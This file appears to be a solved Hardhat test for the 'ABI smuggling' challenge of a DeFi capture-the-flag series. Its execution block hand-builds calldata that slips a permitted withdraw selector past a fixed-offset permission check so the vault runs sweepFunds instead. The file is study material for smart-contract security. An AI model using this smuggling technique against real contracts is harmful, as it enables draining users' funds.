const { ethers } = require('hardhat');
const { expect } = require('chai');
const { executeContractCallWithSigners } = require('@gnosis.pm/safe-contracts');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {

        // function execute in AuthorizedExecutor is vulnerable
        // it uses fixed offset to find selector in calldata
        // but we can move actionData in calldata forward by changing offset in the raw call
        // and write the selector that is allowed to player to the right place in the raw call

        // splits encoded function call into "0x", selector and 32 bytes chunks after
        function splitIntoChunks(str) {
            chunks = [];
            numChunks64 = (str.length - 10) / 64; // number of 32 bytes chunks
            chunks.push(str.substr(0,2)); // push "0x"
            chunks.push(str.substr(2,8)); // push selector
            // push the rest
            for (i = 0; i < numChunks64; i++) {
                chunks.push(
                    str.substr(10 + 64*i, 64)
                );
            }
            return chunks;
        }

        sweepCallData = vault.interface.encodeFunctionData(
            "sweepFunds", 
            [recovery.address, token.address]
        );
        withdrawSelector = vault.interface.getSighash(
            vault.interface.getFunction("withdraw")
        );
        executeSweepCallData = vault.interface.encodeFunctionData(
            "execute", 
            [vault.address, sweepCallData]
        );

        chunks = splitIntoChunks(executeSweepCallData);
        // chunks == [
        //     '0x',
        //     '1cff79cd',
        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
        //     '0000000000000000000000000000000000000000000000000000000000000040',
        //     '0000000000000000000000000000000000000000000000000000000000000044',
        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
        //     '64180aa300000000000000000000000000000000000000000000000000000000'
        // ]
        chunks[3] = "0000000000000000000000000000000000000000000000000000000000000080"; // chunks[3].length == 64
        // chunks == [
        //     '0x',
        //     '1cff79cd',
        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
        //     '0000000000000000000000000000000000000000000000000000000000000080',  change here
        //     '0000000000000000000000000000000000000000000000000000000000000044',
        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
        //     '64180aa300000000000000000000000000000000000000000000000000000000'
        // ]
        chunks.splice(
            4, 
            0, 
            withdrawSelector.substr(2, 8) + "00000000000000000000000000000000000000000000000000000000" // 64 - 8 = 56 zeros
        );
        // chunks == [
        //     '0x',
        //     '1cff79cd',
        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
        //     '0000000000000000000000000000000000000000000000000000000000000080',
        //     'd9caed1200000000000000000000000000000000000000000000000000000000',  new line here
        //     '0000000000000000000000000000000000000000000000000000000000000044',
        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
        //     '64180aa300000000000000000000000000000000000000000000000000000000'
        // ]
        chunks.splice(
            4, 
            0,
            "0000000000000000000000000000000000000000000000000000000000000000" // 64 zeros
        )
        // chunks == [
        //     '0x',
        //     '1cff79cd',
        //     '000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512',
        //     '0000000000000000000000000000000000000000000000000000000000000080',
        //     '0000000000000000000000000000000000000000000000000000000000000000',  new line here
        //     'd9caed1200000000000000000000000000000000000000000000000000000000',
        //     '0000000000000000000000000000000000000000000000000000000000000044',
        //     '85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12',
        //     'fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f',
        //     '64180aa300000000000000000000000000000000000000000000000000000000'
        // ]
        smuggledSweep = chunks.join('');
        
        await player.sendTransaction({
            to: vault.address,
            data: smuggledSweep, 
            gasLimit: 100500
        });

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
